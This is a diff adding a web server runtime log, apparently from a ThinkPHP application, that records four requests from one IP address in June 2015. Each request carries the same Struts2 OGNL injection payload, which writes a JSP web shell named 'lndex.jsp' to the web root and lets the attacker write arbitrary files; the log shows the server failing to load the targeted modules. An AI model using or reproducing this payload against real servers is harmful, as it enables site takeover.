@@ -1,0 +1,24 @@
+[ 2015-06-24T00:43:24+08:00 ] 61.160.213.108 /loginAction.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000096s ]
+ERR: 无法加载模块:LoginAction
+
+[ 2015-06-24T00:43:42+08:00 ] 61.160.213.108 /admin/index.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000098s ]
+ERR: 无法加载模块:Admin
+
+[ 2015-06-24T17:15:38+08:00 ] 61.160.213.108 /index.do?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000123s ]
+ERR: 无法加载模块:Index
+
+[ 2015-06-24T17:15:42+08:00 ] 61.160.213.108 /index.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000104s ]
+ERR: 无法加载模块:Index
+
